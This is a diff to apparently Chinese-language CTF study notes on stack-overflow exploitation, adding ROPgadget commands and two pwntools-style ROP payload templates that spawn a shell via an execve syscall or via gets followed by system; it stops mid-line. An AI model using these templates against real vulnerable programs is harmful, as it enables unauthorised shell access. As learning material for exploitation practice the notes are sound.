@@ -15,11 +15,18 @@ payload:padding1（任意字符一直覆盖完基地址bp） + address of  syste
 
 进入gdb，用vmmap来查看所有段的q始终和权限，用search来寻找/bin/sh
 
-类似于ret2syscall，程序不提供system，需要rop链来组成完整指令。
-
 ROPgadget --binary 程序 --string '/bin/sh'
 ROPgadget --binary 程序  --only 'int'
 ROPgadget --binary 程序  --only 'pop|ret' | grep '寄存器'
 
 注意偏移地址固定，但绝对地址可能变化，开pie时需要泄露某地址来算出。
 
+pwn需要system和/bin/sh（构造rop链，注意函数参数和返回值）
+
+如果没有system
+payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+
+如果没有/bin/sh
+payload = flat(['a' * 112, gets_plt, pop_ebx（任意寄存器）, buf2, system_plt, 'aaaa', buf2])
+
+如果都没有
